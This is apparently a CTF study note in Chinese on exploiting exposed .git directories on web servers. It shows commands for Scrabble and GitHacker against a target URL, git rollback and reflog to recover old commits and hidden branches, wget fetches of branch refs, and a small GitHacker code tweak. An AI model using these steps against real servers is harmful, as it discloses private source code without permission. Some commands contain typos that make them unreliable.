# Git泄露

<aside>
💡 开发过程中遗忘.git文件，错误地提交到服务器，导致通过此文件获取往期源码

</aside>

1. 常规利用
    
    利用Scrabble工具直接获得源码：[工具地址](https://github.com/denny0223/scrabble)
    
    ```bash
    ./scrabble http://target.com/
    ```
    
2. Git回滚获取源码
    - Git覆盖
        
        ```bash
        echo “new content” > doc.php
        ```
        
        ```bash
        git add doc.php
        ```
        
        ```bash
        git commit -m "[version_name]"
        ```
        
    - Git回滚
        
        > 其中，HEAD表示当前版本，而HEAD^表示上一版本
        > 
        
        ```bash
        git reset --hard HEAD^
        ```
        
        1. 查看每个Commit修改了哪些文件
            
            ```bash
            git log -state
            ```
            
        2. 比较在当前版本与想查看的Commit之间的变化
            
            ```bash
            git diff HEAD commit -id
            ```
            
    - 隐藏的Git分支
        
        > Flag可能并不在master的分支中，尝试还原其他分支的代码
        > 
        
        利用GitHacker查看Git提交记录，分支移动记录：[工具地址](https://github.com/WangYihang/GitHacker)
        
        ```bash
        python GitHacker.py [http://ip:port/.git/]
        ```
        
        进入本地生成的文件夹，执行，查询得到master分支信息
        
        ```bash
        git log --all
        ```
        
        ```bash
        git branch -v
        ```
        
        查看checkout记录，获知提交记录，分支移动信息
        
        ```bash
        git reflog
        ```
        
        下载所需分支的Head信息，保存在本地同名同目录下
        
        ```bash
        wget http://ip:port/.git/refs/heads/[target_branch]
        ```
        
        修改`GitHacker.py`，使用`fixmissing`函数，检测Head下分支缺失的文件并恢复
        
        ```python
        if __name__ == "__main__":    
        # main()    
        base_url = complete_url("http://ip:port/.git/")    
        temp_path = replace_bad_char(get_prefix(base_url))    
        fixmissing(base_url, temp_path)
        ```
        

其他工具 

[https://github.com/lijiejie/GitHack](https://github.com/lijiejie/GitHack)